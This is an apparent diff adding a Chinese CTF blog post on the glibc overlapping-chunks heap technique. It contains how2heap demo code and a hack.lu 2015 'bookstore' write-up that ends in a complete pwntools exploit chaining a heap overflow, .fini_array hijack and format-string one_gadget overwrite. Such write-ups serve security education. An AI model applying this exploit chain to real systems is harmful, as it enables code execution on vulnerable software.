@@ -1,0 +1,715 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="overlapping！挺简单的，例题有点离谱但也涨了不少姿势">
+<meta property="og:type" content="article">
+<meta property="og:title" content="overlapping chunks">
+<meta property="og:url" content="http://akaieurus.github.io/2023/02/05/overlapping-chunks/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="overlapping！挺简单的，例题有点离谱但也涨了不少姿势">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc33.jpg">
+<meta property="article:published_time" content="2023-02-05T08:00:40.000Z">
+<meta property="article:modified_time" content="2025-01-03T10:27:49.796Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="how2heap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc33.jpg">
+  
+  
+  
+  <title>overlapping chunks - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc33.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="overlapping chunks"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-05 16:00" pubdate>
+          2023年2月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">overlapping chunks</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>overlapping！挺简单的，例题有点离谱但也涨了不少姿势</p>
+<span id="more"></span>
+
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在2.29unsorted bin增加chunk的size检查之前，如果我们能够控制next chunk的size那就能造成堆块重叠</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure>
+<h1 id="利用一"><a href="#利用一" class="headerlink" title="利用一"></a>利用一</h1><h2 id="2-26以前"><a href="#2-26以前" class="headerlink" title="2.26以前"></a>2.26以前</h2><p>实验代码如下（来自how2heap）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span>&#123;<br><br><br>	<span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4;<br><br>	p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>	p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>	p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br>	<span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>	<span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>	<span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br>	<span class="hljs-built_in">free</span>(p2);<br><br>	<span class="hljs-type">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;<br>	<span class="hljs-type">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;<br><br>	*(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// we are overwriting the &quot;size&quot; field of chunk p2</span><br><br>	p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br>	<span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br>	<span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>示意图如下：</p>
+<img src="/2023/02/05/overlapping-chunks/1.jpg" srcset="/img/loading.gif" lazyload class title="步骤一">
+<p>我们就能通过p4控制p3</p>
+<h2 id="2-27-2-28"><a href="#2-27-2-28" class="headerlink" title="2.27-2.28"></a>2.27-2.28</h2><p>有了tcache，申请的size要大于tcache的范围</p>
+<h2 id="2-29以后"><a href="#2-29以后" class="headerlink" title="2.29以后"></a>2.29以后</h2><p>控制top chunk的preinuse位和presize这个方法依然能够使用</p>
+<h1 id="利用二"><a href="#利用二" class="headerlink" title="利用二"></a>利用二</h1><p>实验代码如下（来自how2hwap）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <br>  <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br>  <span class="hljs-type">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<span class="hljs-comment">//0x3e8</span><br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  real_size_p1 = malloc_usable_size(p1);<br>  real_size_p2 = malloc_usable_size(p2);<br>  real_size_p3 = malloc_usable_size(p3);<br>  real_size_p4 = malloc_usable_size(p4);<br>  real_size_p5 = malloc_usable_size(p5);<br><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br><br>  <span class="hljs-built_in">free</span>(p4);<br><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>; <span class="hljs-comment">//&lt;--- BUG HERE </span><br><br>  <span class="hljs-built_in">free</span>(p2);<br><br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br>  real_size_p6 = malloc_usable_size(p6);<br><br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>示意图如下：</p>
+<img src="/2023/02/05/overlapping-chunks/2.jpg" srcset="/img/loading.gif" lazyload class title="步骤二">
+<p>触发合并能够控制更多的chunk，且所有版本都可用</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="hack-lu-CTF-2015-bookstore"><a href="#hack-lu-CTF-2015-bookstore" class="headerlink" title="hack.lu CTF 2015-bookstore"></a>hack.lu CTF 2015-bookstore</h2><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>漏洞挺多，主要利用的有两个</p>
+<ul>
+<li>edit函数中的数据读入没有长度限制<img src="/2023/02/05/overlapping-chunks/edit.png" srcset="/img/loading.gif" lazyload class title="edit"></li>
+<li>最后有一个格式化字符串漏洞<img src="/2023/02/05/overlapping-chunks/printf.png" srcset="/img/loading.gif" lazyload class title="printf"></li>
+</ul>
+<p>漏洞很多的同时限制也很多，只有两个0x90的堆块可以编辑和释放，以及能申请一个0x140的堆块，但申请完之后会直接退出</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>要触发格式化字符串就要控制dest。如果我们通过edit(order2)来控制dest，edit完又会在dest处写”Your order is submitted!\n”，所以我们就要考虑用别的方法控制dest，过程如下：</p>
+<ul>
+<li>free(order2)</li>
+<li>通过order1的溢出更改order2的size为0x151，这样执行submit过程时使用的chunk order3实际上是order2</li>
+<li>之后会先把order1的内容copy到order2中，再把order2的内容（还是order1的内容）copy到order2中，所以只要order1的data足够长就能溢出到dest中，如果在order1中写入格式化字符串，就能触发格式化字符串漏洞</li>
+</ul>
+<p>还要解决两个问题，就是如何利用格式化字符串返回main函数，第二次执行main函数的时候如何执行one_gadget<br>第一个问题我们可以通过劫持fini_array实现（通过这道题涨的新姿势）<br>第二个问题我们可以通过泄露栈地址，格式化字符串漏洞修改返回地址为one_gadget实现（所以说这是道格式化字符串题不是道堆题(╯‵□′)╯︵┻━┻）</p>
+<h4 id="fini-array"><a href="#fini-array" class="headerlink" title="fini_array"></a>fini_array</h4><p>先捋一遍程序的运行过程<br>众所周知，main并不是程序真正的入口，真正的入口应该是start</p>
+<img src="/2023/02/05/overlapping-chunks/start.png" srcset="/img/loading.gif" lazyload class title="start">
+<p>0x400780就是bookstore程序的start函数<br>gdb跟踪一下程序的过程</p>
+<ul>
+<li>start函数首先调用了__libc_start_main<img src="/2023/02/05/overlapping-chunks/call_libc.png" srcset="/img/loading.gif" lazyload class title="call_libc"></li>
+<li>__libc_start_main有一个call rbp的过程<br>实际调用的是0x400cb0，即init函数<img src="/2023/02/05/overlapping-chunks/call_rbp.png" srcset="/img/loading.gif" lazyload class title="call_rbp">
+<img src="/2023/02/05/overlapping-chunks/init.png" srcset="/img/loading.gif" lazyload class title="init"></li>
+<li>init函数中有个call qword ptr [r12 + rbx*8]的过程，此时r12中存的是0x6011b0，rbx中存的是0<img src="/2023/02/05/overlapping-chunks/call_r12.png" srcset="/img/loading.gif" lazyload class title="call_r12">
+0x6011b0实际上就是.init_array段，即调用函数sub_400850<img src="/2023/02/05/overlapping-chunks/init_array.png" srcset="/img/loading.gif" lazyload class title="init_array"></li>
+<li>__libc_start_main执行完init函数后有一个call rax，此时rax存的是0x400a39，就是执行main函数了<img src="/2023/02/05/overlapping-chunks/call_rax.png" srcset="/img/loading.gif" lazyload class title="call_rax"></li>
+<li>__libc_start_main结束main函数后调用exit<img src="/2023/02/05/overlapping-chunks/call_exit.png" srcset="/img/loading.gif" lazyload class title="call_exit"></li>
+<li>exit调用的__run_exit_handlers函数有一个call rdx的过程，rdx存的是_dl_fini函数<img src="/2023/02/05/overlapping-chunks/call_rdx.png" srcset="/img/loading.gif" lazyload class title="call_rdx">
+但不知道为啥实际执行的是sub_0x400830（源码好复杂看不懂），就是.fini_array段的内容<img src="/2023/02/05/overlapping-chunks/fini_array.png" srcset="/img/loading.gif" lazyload class title="fini_array"></li>
+<li>之后程序就结束了<br>虽然有点云里雾里，但利用方法以及很清楚了，就是利用格式化字符串修改.fini_array段的内容为main函数的地址<br>在No RELRO的情况下.fini_array段是可写的<img src="/2023/02/05/overlapping-chunks/checksec.png" srcset="/img/loading.gif" lazyload class title="checksec">
+<img src="/2023/02/05/overlapping-chunks/vmmap.png" srcset="/img/loading.gif" lazyload class title="vmmap"></li>
+</ul>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit1</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter first order:\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit2</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter second order:\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del1</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del2</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>(<span class="hljs-params">command</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>+command)<br><br>p=process(<span class="hljs-string">&#x27;./bookstore&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>del2()<br>edit1(<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;%2617c%13$hn%31$p%28$p&#x27;</span>+<span class="hljs-string">b&#x27;Q&#x27;</span>*(<span class="hljs-number">0x60</span>-<span class="hljs-number">34</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">28</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x151</span>))<br>submit(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x6011b8</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)[:-<span class="hljs-number">2</span>]<br>ss=p.recvuntil(<span class="hljs-string">b&#x27;Q&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>libcbase=<span class="hljs-built_in">int</span>(s,<span class="hljs-number">16</span>)-libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]-<span class="hljs-number">240</span><br>stack=<span class="hljs-built_in">int</span>(ss,<span class="hljs-number">16</span>)-<span class="hljs-number">0xf50</span>+<span class="hljs-number">0xd68</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>one_addr=p64(libcbase+<span class="hljs-number">0x45206</span>)<br>x=one_addr[<span class="hljs-number">2</span>]<br>p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>payload=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%13$hhn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0x5206</span>-x)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%14$hn&#x27;</span><br>edit1(<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x10</span>+payload.encode()+<span class="hljs-string">b&#x27;Q&#x27;</span>*(<span class="hljs-number">0x60</span>-<span class="hljs-number">12</span>-<span class="hljs-built_in">len</span>(payload))+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">28</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x151</span>))<br>submit(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span>+p64(stack+<span class="hljs-number">2</span>)+p64(stack))<br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/Heap/" class="category-chain-item">Heap</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/how2heap/" class="print-no-link">#how2heap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>overlapping chunks</div>
+      <div>http://akaieurus.github.io/2023/02/05/overlapping-chunks/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年2月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/02/05/house-of-force/" title="house of force">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">house of force</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/05/house-of-lore/" title="house of lore">
+                        <span class="hidden-mobile">house of lore</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
